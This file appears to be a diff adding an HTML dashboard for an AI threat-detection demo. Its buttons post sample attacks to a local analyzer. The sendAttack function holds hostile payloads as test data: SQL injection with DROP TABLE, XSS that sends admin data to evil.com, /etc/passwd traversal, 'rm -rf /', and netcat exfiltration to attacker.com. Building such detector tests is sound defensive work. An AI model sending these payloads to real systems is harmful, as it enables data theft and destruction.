@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kong Guard AI - Real-Time Threat Analysis</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+
+        .status {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+
+        .status.connected { background: #44ff44; color: #000; }
+        .status.disconnected { background: #ff4444; color: #fff; }
+
+        .metrics {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .metric {
+            background: rgba(255,255,255,0.1);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+
+        .metric-label {
+            opacity: 0.8;
+            margin-bottom: 10px;
+        }
+
+        .metric-value {
+            font-size: 2em;
+            font-weight: bold;
+        }
+
+        .card {
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .card h2 {
+            margin-bottom: 20px;
+        }
+
+        .button {
+            background: #4CAF50;
+            color: white;
+            padding: 12px 20px;
+            margin: 5px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            display: block;
+            width: 100%;
+        }
+
+        .button:hover {
+            background: #45a049;
+            transform: translateY(-2px);
+        }
+
+        .button.danger {
+            background: #f44336;
+        }
+
+        .button.danger:hover {
+            background: #da190b;
+        }
+
+        .button.warning {
+            background: #ff9800;
+        }
+
+        .button.warning:hover {
+            background: #e68900;
+        }
+
+        .button.success {
+            background: #4CAF50;
+        }
+
+        .button.success:hover {
+            background: #45a049;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
+
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🛡️ Kong Guard AI</h1>
+        <p>Real-Time AI-Powered Threat Detection</p>
+        <div class="status disconnected" id="status">● CONNECTING...</div>
+    </div>
+
+    <div class="metrics">
+        <div class="metric">
+            <div class="metric-label">Total Analyzed</div>
+            <div class="metric-value" id="totalAnalyzed">0</div>
+        </div>
+        <div class="metric">
+            <div class="metric-label">Test Attacks / Blocked</div>
+            <div class="metric-value" id="threatsBlocked" style="color: #ff4444;">0/0</div>
+        </div>
+        <div class="metric">
+            <div class="metric-label">Avg Confidence</div>
+            <div class="metric-value" id="avgConfidence" style="color: #4444ff;">0%</div>
+        </div>
+        <div class="metric">
+            <div class="metric-label">Avg Processing</div>
+            <div class="metric-value" id="avgProcessing" style="color: #ffaa00;">0ms</div>
+        </div>
+    </div>
+
+    <div class="grid">
+        <div>
+            <div class="card">
+                <h2>🎯 Test Attacks</h2>
+                <button class="button danger" onclick="sendAttack('sql')">
+                    💉 SQL Injection
+                </button>
+                <button class="button warning" onclick="sendAttack('xss')">
+                    🔓 XSS Attack
+                </button>
+                <button class="button warning" onclick="sendAttack('path')">
+                    📁 Path Traversal
+                </button>
+                <button class="button danger" onclick="sendAttack('cmd_injection')">
+                    💥 Command Injection
+                </button>
+                <button class="button warning" onclick="sendAttack('ldap_injection')">
+                    🔐 LDAP Injection
+                </button>
+                <button class="button danger" onclick="sendAttack('business_logic')">
+                    💰 Business Logic Attack
+                </button>
+                <button class="button success" onclick="sendAttack('normal')">
+                    ✅ Normal Traffic
+                </button>
+            </div>
+        </div>
+
+        <div>
+            <div class="card">
+                <h2>📊 Live Status</h2>
+                <div id="currentStatus">Ready to analyze threats...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let ws = null;
+        let metrics = {
+            total: 0,
+            blocked: 0,
+            testAttacks: 0,
+            confidence: 0,
+            processing: 0
+        };
+        
+        let isTestAttack = false;
+
+        function connect() {
+            ws = new WebSocket('ws://localhost:18002/ws');
+            
+            ws.onopen = () => {
+                console.log('Connected to AI Service');
+                document.getElementById('status').className = 'status connected';
+                document.getElementById('status').textContent = '● LIVE';
+            };
+            
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                if (data.type === 'threat_analysis') {
+                    updateAnalysis(data);
+                }
+            };
+            
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+                document.getElementById('status').className = 'status disconnected';
+                document.getElementById('status').textContent = '● DISCONNECTED';
+            };
+            
+            ws.onclose = () => {
+                document.getElementById('status').className = 'status disconnected';
+                document.getElementById('status').textContent = '● RECONNECTING...';
+                setTimeout(connect, 3000);
+            };
+        }
+
+        function updateAnalysis(messageData) {
+            const data = messageData.data || {};
+            
+            metrics.total++;
+            
+            if (isTestAttack) {
+                metrics.testAttacks++;
+                isTestAttack = false;
+            } else if ((data.threat_score || 0) > 0.7) {
+                metrics.blocked++;
+            }
+            
+            const confidence = data.confidence || 0;
+            const processingTime = data.processing_time_ms || (data.processing_time ? data.processing_time * 1000 : 0);
+            
+            if (confidence > 0) {
+                metrics.confidence = ((metrics.confidence * (metrics.total - 1) + confidence) / metrics.total);
+            }
+            if (processingTime > 0) {
+                metrics.processing = ((metrics.processing * (metrics.total - 1) + processingTime) / metrics.total);
+            }
+            
+            document.getElementById('totalAnalyzed').textContent = metrics.total;
+            document.getElementById('threatsBlocked').textContent = metrics.testAttacks + '/' + metrics.blocked;
+            document.getElementById('avgConfidence').textContent = (metrics.confidence * 100).toFixed(1) + '%';
+            document.getElementById('avgProcessing').textContent = metrics.processing.toFixed(0) + 'ms';
+            
+            const threatType = data.threat_type || 'none';
+            const threatScore = ((data.threat_score || 0) * 100).toFixed(1);
+            const action = data.recommended_action || 'monitor';
+            
+            document.getElementById('currentStatus').innerHTML = 
+                '<strong>Latest:</strong> ' + threatType + ' (' + threatScore + '%) - ' + action.toUpperCase();
+        }
+
+        async function sendAttack(type) {
+            isTestAttack = true;
+            
+            const attacks = {
+                sql: {
+                    query: "id=1' OR '1'='1; DROP TABLE users;--",
+                    path: "/api/users",
+                    method: "GET",
+                    body: "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin--"
+                },
+                xss: {
+                    query: "alert('XSS')",
+                    path: "/comment",
+                    method: "POST", 
+                    body: "fetch('/admin/users').then(r=>r.text()).then(d=>fetch('//evil.com/?'+btoa(d)))"
+                },
+                path: {
+                    query: "file=../../../../etc/passwd",
+                    path: "/download",
+                    method: "GET",
+                    body: ""
+                },
+                cmd_injection: {
+                    query: "ping=127.0.0.1; rm -rf / #",
+                    path: "/api/ping",
+                    method: "POST",
+                    body: "; cat /etc/passwd | nc attacker.com 4444 &"
+                },
+                ldap_injection: {
+                    query: "user=admin')(&(password=*))",
+                    path: "/auth/ldap",
+                    method: "POST",
+                    body: "admin')(&(password=*)(|(objectClass=*)))"
+                },
+                business_logic: {
+                    query: "amount=-999999&to_account=attacker",
+                    path: "/api/transfer",
+                    method: "POST",
+                    body: '{"amount": -50000000, "from": "bank_reserves", "to": "attacker_account"}'
+                },
+                normal: {
+                    query: "page=1&limit=10&sort=date",
+                    path: "/api/products",
+                    method: "GET",
+                    body: ""
+                }
+            };
+            
+            const attack = attacks[type];
+            if (!attack) return;
+            
+            try {
+                await fetch('http://localhost:18002/analyze', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        features: {
+                            method: attack.method,
+                            path: attack.path,
+                            client_ip: '192.168.1.' + Math.floor(Math.random() * 255),
+                            user_agent: type === 'normal' ? 'Mozilla/5.0' : 'AttackBot/1.0',
+                            requests_per_minute: type === 'normal' ? 10 : 100,
+                            content_length: (attack.body || attack.query || '').length,
+                            query_param_count: 2,
+                            header_count: 5,
+                            hour_of_day: new Date().getHours(),
+                            query: attack.query,
+                            body: attack.body || "",
+                            headers: {}
+                        },
+                        context: {
+                            previous_requests: Math.floor(Math.random() * 100),
+                            failed_attempts: type === 'normal' ? 0 : 5,
+                            anomaly_score: type === 'normal' ? 0.1 : 0.8
+                        }
+                    })
+                });
+            } catch (error) {
+                console.error('Failed to send attack:', error);
+            }
+        }
+
+        // Connect on load
+        connect();
+    </script>
+</body>
+</html>
